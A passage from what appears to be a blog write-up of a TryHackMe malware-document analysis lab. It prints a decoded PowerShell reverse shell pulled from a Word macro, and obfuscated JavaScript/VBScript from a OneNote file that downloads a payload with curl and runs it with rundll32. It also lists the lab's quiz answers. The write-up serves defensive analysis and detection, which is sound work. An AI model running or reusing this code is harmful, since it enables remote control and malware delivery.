        Str <span class="o">=</span> Str + <span class="s2">"dXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJ"</span>
        Str <span class="o">=</span> Str + <span class="s2">"HN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk"</span>
        Str <span class="o">=</span> Str + <span class="s2">"pIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hb"</span>
        Str <span class="o">=</span> Str + <span class="s2">"WUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5"</span>
        Str <span class="o">=</span> Str + <span class="s2">"nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0Y"</span>
        Str <span class="o">=</span> Str + <span class="s2">"SAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2V"</span>
        Str <span class="o">=</span> Str + <span class="s2">"uZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZ"</span>
        Str <span class="o">=</span> Str + <span class="s2">"W5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXR"</span>
        Str <span class="o">=</span> Str + <span class="s2">"CeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kY"</span>
        Str <span class="o">=</span> Str + <span class="s2">"nl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2g"</span>
        Str <span class="o">=</span> Str + <span class="s2">"oKX07JGNsaWVudC5DbG9zZSgp"</span>

        CreateObject<span class="o">(</span><span class="s2">"Wscript.Shell"</span><span class="o">)</span>.Run Str
End Sub
</code></pre></div></div> <p>Now we successfully extracted the VBA script and got an idea of its capabilities, we can use <code class="language-plaintext highlighter-rouge">vmonkey &lt;document&gt;</code> to analyze and emulate the behavior of malicious macros in Microsoft Office documents.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>vmonkey suspicious.doc 
 _    ___                 __  ___            __             
| |  / <span class="o">(</span>_<span class="o">)</span>___  ___  _____/  |/  /___  ____  / /_____  __  __
| | / / / __ <span class="se">\/</span> _ <span class="se">\/</span> ___/ /|_/ / __ <span class="se">\/</span> __ <span class="se">\/</span> //_/ _ <span class="se">\/</span> / / /
| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,&lt; /  __/ /_/ / 
|___/_/ .___/<span class="se">\_</span>__/_/  /_/  /_/<span class="se">\_</span>___/_/ /_/_/|_|<span class="se">\_</span>__/<span class="se">\_</span>_, /  
     /_/                                           /____/   
vmonkey 0.08 - https://github.com/decalage2/ViperMonkey
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/ViperMonkey/issues

<span class="o">===============================================================================</span>
FILE: suspicious.doc
INFO     Starting emulation...
INFO     Emulating an Office <span class="o">(</span>VBA<span class="o">)</span> file.
INFO     Reading document metadata...
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py"</span>, line 15, <span class="k">in</span> &lt;module&gt;
    from unotools import Socket, connect
ModuleNotFoundError: No module named <span class="s1">'unotools'</span>
ERROR    Running export_all_excel_sheets.py failed. Command <span class="s1">'['</span>python3<span class="s1">', '</span>/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py<span class="s1">', '</span>/tmp/tmp_excel_file_1428744234<span class="s1">']'</span> returned non-zero <span class="nb">exit </span>status 1
ERROR    Reading <span class="k">in </span>file as Excel with xlrd failed. Can<span class="s1">'t find workbook in OLE2 compound document
INFO     Saving dropped analysis artifacts in .//suspicious.doc_artifacts/
INFO     Parsing VB...
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file:  - OLE stream: u'</span>Macros/VBA/ThisDocument<span class="s1">'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file:  - OLE stream: u'</span>Macros/VBA/NewMacros<span class="s1">'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Sub AutoOpen()
        AutoOpenMacro
End Sub
...
</span></code></pre></div></div> <p>Where we used to perform static analysis and extraction, <em>Vipermonkey</em> now enables dynamic analysis by executing the embedded macro in an isolated environment to extract IOCs and other valuable information.</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TRACING VBA CODE (entrypoint = Auto*):
INFO     Found possible intermediate IOC (URL): 'http://schemas.openxmlformats.org/drawingml/2006/main'
INFO     Emulating loose statements...
INFO     ACTION: Found Entry Point - params 'autoopen' - 
INFO     evaluating Sub AutoOpen
INFO     Calling Procedure: AutoOpenMacro('[]')
INFO     evaluating Sub AutoOpenMacro
INFO     Found possible intermediate IOC (base64): 'powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoImh ...'
INFO     calling Function: CreateObject('Wscript.Shell')
INFO     ACTION: CreateObject - params ['Wscript.Shell'] - Interesting Function Call
INFO     calling Function: Run('powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2...)
...

Recorded Actions:
+-------------------+---------------------------+---------------------------+
| Action            | Parameters                | Description               |
+-------------------+---------------------------+---------------------------+
| Found Entry Point | autoopen                  |                           |
| CreateObject      | ['Wscript.Shell']         | Interesting Function Call |
| Run               | ['powershell.exe -nop -w  | Interesting Function Call |
|                   | hidden -e bGllbnQgPSBOZXc |                           |
|                   | tT2JqZWN0IFN5c3RlbS5OZXQu |    
...

</code></pre></div></div> <p>As a result, we get a false positive URL and an interesting base64 encoded string. Using tools like <em>Cyberchef</em> or <code class="language-plaintext highlighter-rouge">base64 -d</code>, we are able to get the actual powershell code.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"http://thmredteam.thm/stage2.exe"</span><span class="p">,</span><span class="mi">4444</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nx">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="p">);</span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"PS "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&gt; "</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
</span></code></pre></div></div> <p>The base64 decoded string result clearly shows the Powershell code. It is evident that the document would try to connect to the C2 server on port <em>4444</em> to download the malware called <em>stage2</em>.</p> <pre><code class="language-url">http://thmredteam.thm/stage2.exe
</code></pre> <p>Finally, we have found the IOC, which is a C2 server. From a SOC analyst’s perspective, we will move on creating a detection rule on outbound traffic to detect if any host has communicated to this C2 server in the past or in the future. If any communication is observed, it means the host have been comprmised and needs immediate remedy.</p> <h3 id="questions-2">Questions</h3> <p><strong>What is the author name of the document found during the analysis?</strong></p> <p>This question can be answered with <code class="language-plaintext highlighter-rouge">olemeta</code>/<code class="language-plaintext highlighter-rouge">oledump</code>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">CMNatic</code></em></p> <p><strong>How many macros are embedded in the document?</strong></p> <p>This question can be answered with <code class="language-plaintext highlighter-rouge">olevba</code>/<code class="language-plaintext highlighter-rouge">oledump</code>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>What is the URL extracted from the suspicious.doc file?</strong></p> <p>Using <em>Cyberchef</em> with <em>From Base64 -&gt; Extract URLs</em>:</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">http://thmredteam.thm/stage2.exe</code></em></p> <h2 id="task-9---onenote">Task 9 - OneNote</h2> <p>OneNote is a popular note-taking and collaboration tool developed by Microsoft. It allows users to create and organize digital notebooks containing various types of content, such as text, images, audio … OneNote files are saved with a <em>.one</em> or <em>.onenote</em> extension.</p> <p>Recently, different APT groups have started utilizing OneNote document in their recent campaigns. In <a href="https://bazaar.abuse.ch/browse.php?search=file_type%3Aone" rel="external nofollow noopener" target="_blank">MalwareBazaar</a>, it is possible to retrieve plenty of rogue notes.</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/H16m2AQxyg.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="MalwareVazaar OneNote Documents" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>We will be using one of the documents from the above list to practice analyzing and see if we can extract some ofuscated code or IOCs.</p> <p>Within the provided lab, we will be using the <code class="language-plaintext highlighter-rouge">invoice.one</code> document.</p> <h3 id="analyzing-the-document">Analyzing the document</h3> <p>We will use <code class="language-plaintext highlighter-rouge">trid</code> for file identification. It is indeed a OneNote document.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/onenoteDocs<span class="nv">$ </span>trid invoice.one 

TrID/32 - File Identifier v2.24 - <span class="o">(</span>C<span class="o">)</span> 2003-16 By M.Pontello
Definitions found:  13206
Analyzing...

Collecting data from file: invoice.one
100.0% <span class="o">(</span>.ONE<span class="o">)</span> Microsoft OneNote note <span class="o">(</span>16008/2<span class="o">)</span>
</code></pre></div></div> <p>Firstly, we take out strings to see if there is anything interesting in the file like <em>IP addresses, scripts, domains</em>…</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/onenoteDocs<span class="nv">$ </span>strings invoice.one <span class="nt">-n</span> 20
Copyright <span class="o">(</span>c<span class="o">)</span> 1998 Hewlett-Packard Company
IEC http://www.iec.ch
IEC http://www.iec.ch
.IEC 61966-2.1 Default RGB colour space - sRGB
.IEC 61966-2.1 Default RGB colour space - sRGB
,Reference Viewing Condition <span class="k">in </span>IEC61966-2.1
,Reference Viewing Condition <span class="k">in </span>IEC61966-2.1
Copyright <span class="o">(</span>c<span class="o">)</span> 1998 Hewlett-Packard Company
IEC http://www.iec.ch
IEC http://www.iec.ch
.IEC 61966-2.1 Default RGB colour space - sRGB
.IEC 61966-2.1 Default RGB colour space - sRGB
,Reference Viewing Condition <span class="k">in </span>IEC61966-2.1
,Reference Viewing Condition <span class="k">in </span>IEC61966-2.1
&lt;div <span class="nb">id</span><span class="o">=</span><span class="s2">"content"</span><span class="o">&gt;</span>f5&amp;u5&amp;n5&amp;c5&amp;t5&amp;i5&amp;o5&amp;n5&amp; 5&amp;s5&amp;l5&amp;e5&amp;e5&amp;p5&amp;<span class="o">(</span>5&amp;m5&amp;i5&amp;l5&amp;l5&amp;i5&amp;s5&amp;<span class="o">)</span>5&amp;<span class="o">{</span>5&amp;v5&amp;a5&amp;r5&amp; 5&amp;d5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;e5&amp;w5&amp; 5&amp;D5&amp;a5&amp;t5&amp;e5&amp;<span class="o">(</span>5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;v5&amp;a5&amp;r5&amp; 5&amp;c5&amp;u5&amp;r5&amp;D5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;u5&amp;l5&amp;l5&amp;<span class="p">;</span>5&amp;d5&amp;o5&amp; 5&amp;<span class="o">{</span>5&amp; 5&amp;c5&amp;u5&amp;r5&amp;D5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;e5&amp;w5&amp; 5&amp;D5&amp;a5&amp;t5&amp;e5&amp;<span class="o">(</span>5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp; 5&amp;<span class="o">}</span>5&amp;w5&amp;h5&amp;i5&amp;l5&amp;e5&amp;
...
&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"javascript"</span><span class="o">&gt;</span>
var hello <span class="o">=</span> <span class="s2">"39cd7b469beae7c617c73e0d008195ef"</span><span class="p">;</span>
var content <span class="o">=</span> document.getElementById<span class="o">(</span><span class="s2">"content"</span><span class="o">)</span>.innerText<span class="p">;</span>
&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"vbscript"</span><span class="o">&gt;</span>
Dim ws : Set ws <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">"WScript.Shell"</span><span class="o">)</span>
ws.RegWrite <span class="s2">"HKCU</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\A</span><span class="s2">ndromedia</span><span class="se">\M</span><span class="s2">p4ToAvi</span><span class="se">\V</span><span class="s2">alues"</span>, content, <span class="s2">"REG_SZ"</span>
<span class="s1">' msgbox ws.RegRead("HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values")
&lt;script language="javascript"&gt;
var body = ws.RegRead("HKCU\\SOFTWARE\\Andromedia\\Mp4ToAvi\\Values");
var func = Function("url", body.replace(/5&amp;/g, ""));
func("https://unitedmedicalspecialties.com/T1Gpp/OI.png");
&lt;script language="vbscript"&gt;
ws.RegDelete("HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values")
&lt;html&gt;&lt;head&gt;&lt;script language="vbscript"&gt;
Sub PsIfYCwsFUxaTzhDcniBNSKKlpFvBQkq(fVyZuxSyFixqmNzeEtgoYpnLGIiLoMtQAkqFX) : eval("execute(fVyZuxSyFixqmNzeEtgoYpnLGIiLoMtQAkqFX)") : End Sub
...
</span></code></pre></div></div> <p>Because it looks like we are getting some references to some suspicious code, we will use another utility called <code class="language-plaintext highlighter-rouge">onedump.py</code>.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/onenoteDocs<span class="nv">$ </span>python3 onedump.py invoice.one 
File: invoice.one
 1: 0x00001740 .... ffd8ffe2 0x00015b4f 4d5f7afd30851031376da0fa6d0e3f80
 2: 0x0001d290 .... ffd8ffe2 0x0000d36f 2ccb7fd40e61b6dd2cd936e61929fb81
 3: 0x0002ae58 .PNG 89504e47 0x000000ef 088833d5a4fdcd105a34657922326f76
 4: 0x0002bb00 .PNG 89504e47 0x00000128 33dca72504d567c57f95452a0358ed2f
 5: 0x0002bc60 &lt;htm 3c68746d 0x00000817 c9d2355fc2be90b0fa73ecb67061a77e
 6: 0x0002d628 &lt;htm 3c68746d 0x00005c19 b915056524f1b25937074727cdf5f87c
</code></pre></div></div> <p>Subsequently, we get two interesting objects which seem to have HTML files. We shall use <code class="language-plaintext highlighter-rouge">-s X</code>, which <em>X</em> is the object number, to search for the <em>X</em> object and the <code class="language-plaintext highlighter-rouge">-d</code> flag to dump it on the screen.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/onenoteDocs<span class="nv">$ </span>python3 onedump.py <span class="nt">-s</span> 5 <span class="nt">-d</span> invoice.one 
&lt;html&gt;

&lt;div <span class="nb">id</span><span class="o">=</span><span class="s2">"content"</span><span class="o">&gt;</span>f5&amp;u5&amp;n5&amp;c5&amp;t5&amp;i5&amp;o5&amp;n5&amp; 5&amp;s5&amp;l5&amp;e5&amp;e5&amp;p5&amp;<span class="o">(</span>5&amp;m5&amp;i5&amp;l5&amp;l5&amp;i5&amp;s5&amp;<span class="o">)</span>5&amp;<span class="o">{</span>5&amp;v5&amp;a5&amp;r5&amp; 5&amp;d5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;e5&amp;w5&amp; 5&amp;D5&amp;a5&amp;t5&amp;e5&amp;<span class="o">(</span>5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;v5&amp;a5&amp;r5&amp; 5&amp;c5&amp;u5&amp;r5&amp;D5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;u5&amp;l5&amp;l5&amp;<span class="p">;</span>5&amp;d5&amp;o5&amp; 5&amp;<span class="o">{</span>5&amp; 5&amp;c5&amp;u5&amp;r5&amp;D5&amp;a5&amp;t5&amp;e5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;e5&amp;w5&amp; 5&amp;D5&amp;a5&amp;t5&amp;e5&amp;<span class="o">(</span>5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp; 5&amp;<span class="o">}</span>5&amp;w5&amp;h5&amp;i5&amp;l5&amp;e5&amp;<span class="o">(</span>5&amp;c5&amp;u5&amp;r5&amp;D5&amp;a5&amp;t5&amp;e5&amp; 5&amp;-5&amp; 5&amp;d5&amp;a5&amp;t5&amp;e5&amp; 5&amp;&lt;5&amp; 5&amp;m5&amp;i5&amp;l5&amp;l5&amp;i5&amp;s5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;<span class="o">}</span>5&amp;/5&amp;<span class="k">*</span>5&amp;<span class="k">*</span>5&amp; 5&amp;v5&amp;a5&amp;r5&amp; 5&amp;u5&amp;r5&amp;l5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;<span class="s2">"5&amp;h5&amp;t5&amp;t5&amp;p5&amp;s5&amp;:5&amp;/5&amp;/5&amp;g5&amp;o5&amp;o5&amp;g5&amp;l5&amp;e5&amp;.5&amp;c5&amp;o5&amp;m5&amp;"</span>5&amp;<span class="p">;</span>5&amp; 5&amp;<span class="k">*</span>5&amp;/5&amp;n5&amp;e5&amp;w5&amp; 5&amp;A5&amp;c5&amp;t5&amp;i5&amp;v5&amp;e5&amp;X5&amp;O5&amp;b5&amp;j5&amp;e5&amp;c5&amp;t5&amp;<span class="o">(</span>5&amp;<span class="s2">"5&amp;w5&amp;s5&amp;c5&amp;r5&amp;i5&amp;p5&amp;t5&amp;.5&amp;s5&amp;h5&amp;e5&amp;l5&amp;l5&amp;"</span>5&amp;<span class="o">)</span>5&amp;.5&amp;r5&amp;u5&amp;n5&amp;<span class="o">(</span>5&amp;<span class="s2">"5&amp;c5&amp;u5&amp;r5&amp;l5&amp;.5&amp;e5&amp;x5&amp;e5&amp; 5&amp;-5&amp;-5&amp;o5&amp;u5&amp;t5&amp;p5&amp;u5&amp;t5&amp; 5&amp;C5&amp;:5&amp;</span><span class="se">\5</span><span class="s2">&amp;</span><span class="se">\5</span><span class="s2">&amp;P5&amp;r5&amp;o5&amp;g5&amp;r5&amp;a5&amp;m5&amp;D5&amp;a5&amp;t5&amp;a5&amp;</span><span class="se">\5</span><span class="s2">&amp;</span><span class="se">\5</span><span class="s2">&amp;i5&amp;n5&amp;d5&amp;e5&amp;x5&amp;15&amp;.5&amp;p5&amp;n5&amp;g5&amp; 5&amp;-5&amp;-5&amp;u5&amp;r5&amp;l5&amp; 5&amp;"</span>5&amp; 5&amp;+5&amp; 5&amp;u5&amp;r5&amp;l5&amp;,5&amp; 5&amp;05&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;s5&amp;l5&amp;e5&amp;e5&amp;p5&amp;<span class="o">(</span>5&amp;15&amp;55&amp;05&amp;05&amp;05&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;v5&amp;a5&amp;r5&amp; 5&amp;s5&amp;h5&amp;e5&amp;l5&amp;l5&amp; 5&amp;<span class="o">=</span>5&amp; 5&amp;n5&amp;e5&amp;w5&amp; 5&amp;A5&amp;c5&amp;t5&amp;i5&amp;v5&amp;e5&amp;X5&amp;O5&amp;b5&amp;j5&amp;e5&amp;c5&amp;t5&amp;<span class="o">(</span>5&amp;<span class="s2">"5&amp;s5&amp;h5&amp;e5&amp;l5&amp;l5&amp;.5&amp;a5&amp;p5&amp;p5&amp;l5&amp;i5&amp;c5&amp;a5&amp;t5&amp;i5&amp;o5&amp;n5&amp;"</span>5&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;s5&amp;h5&amp;e5&amp;l5&amp;l5&amp;.5&amp;s5&amp;h5&amp;e5&amp;l5&amp;l5&amp;e5&amp;x5&amp;e5&amp;c5&amp;u5&amp;t5&amp;e5&amp;<span class="o">(</span>5&amp;<span class="s2">"5&amp;r5&amp;u5&amp;n5&amp;d5&amp;l5&amp;l5&amp;35&amp;25&amp;"</span>5&amp;,5&amp; 5&amp;<span class="s2">"5&amp;C5&amp;:5&amp;</span><span class="se">\5</span><span class="s2">&amp;</span><span class="se">\5</span><span class="s2">&amp;P5&amp;r5&amp;o5&amp;g5&amp;r5&amp;a5&amp;m5&amp;D5&amp;a5&amp;t5&amp;a5&amp;</span><span class="se">\5</span><span class="s2">&amp;</span><span class="se">\5</span><span class="s2">&amp;i5&amp;n5&amp;d5&amp;e5&amp;x5&amp;15&amp;.5&amp;p5&amp;n5&amp;g5&amp;,5&amp;W5&amp;i5&amp;n5&amp;d5&amp;"</span>5&amp;,5&amp; 5&amp;<span class="s2">"5&amp;"</span>5&amp;,5&amp; 5&amp;<span class="s2">"5&amp;o5&amp;p5&amp;e5&amp;n5&amp;"</span>5&amp;,5&amp; 5&amp;35&amp;<span class="o">)</span>5&amp;<span class="p">;</span>5&amp;&lt;/div&gt;

&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"javascript"</span><span class="o">&gt;</span>

var hello <span class="o">=</span> <span class="s2">"39cd7b469beae7c617c73e0d008195ef"</span><span class="p">;</span>

var content <span class="o">=</span> document.getElementById<span class="o">(</span><span class="s2">"content"</span><span class="o">)</span>.innerText<span class="p">;</span>

&lt;/script&gt;

&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"vbscript"</span><span class="o">&gt;</span>

Dim ws : Set ws <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">"WScript.Shell"</span><span class="o">)</span>

<span class="s1">' Write reg
ws.RegWrite "HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values", content, "REG_SZ"

'</span> msgbox ws.RegRead<span class="o">(</span><span class="s2">"HKCU</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\A</span><span class="s2">ndromedia</span><span class="se">\M</span><span class="s2">p4ToAvi</span><span class="se">\V</span><span class="s2">alues"</span><span class="o">)</span>

&lt;/script&gt;

&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"javascript"</span><span class="o">&gt;</span>

var body <span class="o">=</span> ws.RegRead<span class="o">(</span><span class="s2">"HKCU</span><span class="se">\\</span><span class="s2">SOFTWARE</span><span class="se">\\</span><span class="s2">Andromedia</span><span class="se">\\</span><span class="s2">Mp4ToAvi</span><span class="se">\\</span><span class="s2">Values"</span><span class="o">)</span><span class="p">;</span>

var func <span class="o">=</span> Function<span class="o">(</span><span class="s2">"url"</span>, body.replace<span class="o">(</span>/5&amp;/g, <span class="s2">""</span><span class="o">))</span><span class="p">;</span>
func<span class="o">(</span><span class="s2">"https://unitedmedicalspecialties.com/T1Gpp/OI.png"</span><span class="o">)</span><span class="p">;</span>

&lt;/script&gt;

&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"vbscript"</span><span class="o">&gt;</span>

ws.RegDelete<span class="o">(</span><span class="s2">"HKCU</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\A</span><span class="s2">ndromedia</span><span class="se">\M</span><span class="s2">p4ToAvi</span><span class="se">\V</span><span class="s2">alues"</span><span class="o">)</span>

<span class="s1">' Close window
window.close

&lt;/script&gt;

&lt;/html&gt;
</span></code></pre></div></div> <p>This file looks like HTML code containing obfuscated Javascript and VBScript. We will save it using <code class="language-plaintext highlighter-rouge">python3 onedump.py -s 5 -d invoice.one &gt; obj5</code> and open it in notepad.</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/SyA0QkEg1g.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="OneNote obfuscated code" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>This extraction results in some interesting obfuscated code. The javascript part clearly uses a <em>replace</em> function to remove <code class="language-plaintext highlighter-rouge">5&amp;</code> from the string.</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/rJw5Nk4e1l.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="OneNote deobfuscated code" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>Now, the code makes more sense and contains some important IOCs. To sum up the findings:</p> <ul> <li>The OneNote document contains <strong>two suspicious HTML</strong> objects.</li> <li>This script contains <strong>obfuscated code</strong>, which is cleared out by removing <code class="language-plaintext highlighter-rouge">5&amp;</code>.</li> <li>The script <strong>writes the deobfuscated script to the registry</strong> <code class="language-plaintext highlighter-rouge">HKCU\\SOFTWARE\\Andromedia\\Mp4ToAvi\\Values</code>.</li> <li> <strong>Runs the script</strong>.</li> <li> <strong>C2 domain</strong> is <code class="language-plaintext highlighter-rouge">hxxps[:]//unitedmedicalspecialties[.]com/T1Gpp/OI.png</code>.</li> <li>It <strong>downloads the payload</strong> using <em>cURL</em> and outputs the payload into <em>index1.png</em> with <code class="language-plaintext highlighter-rouge">curl.exe --output C:\\\\ProgramData\\\\index1.png --url " + url, 0);</code>.</li> <li> <strong>Sleeps for 15 seconds</strong> using <code class="language-plaintext highlighter-rouge">sleep(15000)</code>.</li> <li> <strong>Runs the payload</strong> using <em>rundll32</em> -&gt; <code class="language-plaintext highlighter-rouge">shell.shellexecute("rundll32", "C:\\ProgramData\\index1.png,Wind", "", "open", 3);</code>.</li> <li> <strong>Deletes the registry entry</strong>.</li> </ul> <h3 id="questions-3">Questions</h3> <p><strong>What is the value used in the sleep function?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">15000</code></em></p> <p><strong>The cURL command is being used to download from a URL and saving the payload in a png file. What is that file name?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">index1.png</code></em></p> <p><strong>How many objects are found in the <em>invoice.one</em> document?</strong></p> <p>It is known by checking how many objects are listed in <code class="language-plaintext highlighter-rouge">onedump.py</code>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">6</code></em></p> <h2 id="task-10---conclusion">Task 10 - Conclusion</h2> <p>In conclusion, we have examined various document file types and explored how they can be weaponized in cyberattacks. Our focus was primarily on the PDF format, where we learned to perform static analysis by inspecting obfuscated JavaScript. We also explored 97-2003 Word documents, extracting Indicators of Compromise (IOCs) from VBA macros, and analyzed OneNote files, particularly those containing HTML embedded objects with obfuscated JavaScript and VBS code.</p> <p>Future modules will delve into more advanced topics, such as dynamic document analysis and deobfuscating scripts like PowerShell, JavaScript, and VBScript.</p> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/THM-Advanced-Static-Analysis/">THM Advanced Static Analysis</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold 